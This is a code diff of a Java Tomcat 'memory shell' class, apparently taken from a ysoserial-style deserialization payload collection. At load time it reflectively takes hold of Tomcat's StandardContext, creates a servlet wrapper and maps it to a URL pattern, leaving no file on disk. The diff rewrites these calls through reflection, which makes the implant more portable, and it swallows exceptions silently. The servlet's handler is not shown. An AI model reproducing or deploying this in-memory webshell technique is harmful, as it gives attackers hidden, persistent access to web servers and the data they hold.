@@ -1,4 +1,4 @@
-package yspserial.payloads.memshell.tomcat;
+package com.demo.memshell;
 
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
@@ -24,29 +24,30 @@ public class TomcatServletContextClassMS implements Servlet {
     static {
         try {
             // 获取 standardContext
-            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            org.apache.catalina.core.StandardContext standardContext;
+            Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
+            Object standardContext;
             try {
                 Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                 getResourcesmethod.setAccessible(true);
                 Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                 Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                 getContextmethod.setAccessible(true);
-                standardContext = (org.apache.catalina.core.StandardContext) getContextmethod.invoke(resources);
+                standardContext = getContextmethod.invoke(resources);
             } catch (Exception e) {
                 Object root = getFieldValue(webappClassLoaderBase, "resources");
-                standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
+                standardContext = getFieldValue(root, "context");
             }
 
             // wrapper 封装
-            if (standardContext.findChild(NAME) == null) {
-                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
-                wrapper.setName(NAME);
+            Object container = standardContext.getClass().getSuperclass().getDeclaredMethod("findChild", String.class).invoke(standardContext, NAME);
+            if (container == null) {
+                Object wrapper = standardContext.getClass().getDeclaredMethod("createWrapper").invoke(standardContext);
+                wrapper.getClass().getSuperclass().getDeclaredMethod("setName", String.class).invoke(wrapper, NAME);
                 Servlet servlet = new TomcatServletContextClassMS();
-                wrapper.setServletClass(servlet.getClass().getName());
-                wrapper.setServlet(servlet);
+                wrapper.getClass().getDeclaredMethod("setServletClass", String.class).invoke(wrapper, servlet.getClass().getName());
+                wrapper.getClass().getDeclaredMethod("setServlet", Servlet.class).invoke(wrapper, servlet);
                 // 添加到 standardContext
-                standardContext.addChild(wrapper);
+                standardContext.getClass().getSuperclass().getDeclaredMethod("addChild", Class.forName("org.apache.catalina.Container")).invoke(standardContext, wrapper);
 
                 try {
                     // M1 Servlet映射到URL模式
@@ -58,8 +59,12 @@ public class TomcatServletContextClassMS implements Servlet {
                     // M2 Servlet3 新特性 Dynamic
 //                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
 //                        registration.addMapping(pattern);
-                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
+
+//                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
+                    Object applicationServletRegistration = Class.forName("org.apache.catalina.core.ApplicationServletRegistration").getConstructor(Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")).newInstance(wrapper, standardContext);
+                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(applicationServletRegistration, (Object) new String[]{pattern});
                 }
+
             }
         } catch (Exception e) {
         }
